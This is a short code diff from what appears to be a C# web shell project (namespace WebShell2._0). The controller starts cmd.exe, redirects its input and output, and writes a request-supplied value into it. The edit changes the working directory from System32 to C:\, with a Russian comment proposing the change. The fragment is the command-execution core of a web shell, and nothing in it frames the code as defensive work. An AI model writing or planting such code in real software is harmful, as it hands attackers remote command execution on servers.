@@ -43,7 +43,7 @@ namespace WebShell2._0.Controllers
             p.StartInfo.UseShellExecute = false;
             p.StartInfo.RedirectStandardInput = true;
             p.StartInfo.RedirectStandardOutput = true;
-            p.StartInfo.WorkingDirectory = @"C:\Windows\System32\"; //можно убрать @"C:\Windows\System32\"
+            p.StartInfo.WorkingDirectory = @"C:\"; //можно убрать @"C:\Windows\System32\" и заменить на @"C:\"
             p.StartInfo.FileName = "cmd.exe";
             p.Start();
             p.StandardInput.WriteLine(name);
